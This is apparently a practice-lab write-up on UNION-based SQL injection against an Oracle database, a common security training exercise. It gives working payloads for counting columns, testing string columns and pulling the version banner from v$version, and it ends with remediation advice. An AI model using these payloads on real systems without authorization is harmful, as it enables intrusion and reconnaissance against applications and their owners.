# Lab 12: Querying the database type and version on Oracle

**Date:** February 6, 2026
**Vulnerability Type:** SQL Injection (UNION-based)
**Difficulty:** Practitioner
**Status:** SOLVED

## 1. Objective
Identify the specific version and build information of an Oracle database using a UNION-based injection.

## 2. Methodology
Oracle requires a specific syntax for UNION attacks, notably the inclusion of a `FROM` clause even for dummy queries (typically `FROM dual`). System information is retrieved from the `v$version` table.

### Step 1: Determine Column Count
- **Payload:** `' ORDER BY 2--` (Confirmed 2 columns).

### Step 2: Identify String-Compatible Column
- **Payload:** `' UNION SELECT 'abc', 'def' FROM dual--` (Both columns confirmed).

### Step 3: Version Exfiltration
- **Payload:** `' UNION SELECT banner, NULL FROM v$version--`

## 3. Results
The database returned the following version information:
- **Result:** `Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production`

## 4. Remediation
Use parameterized queries and restrict access to system views (like `v$version`) for low-privilege application accounts.
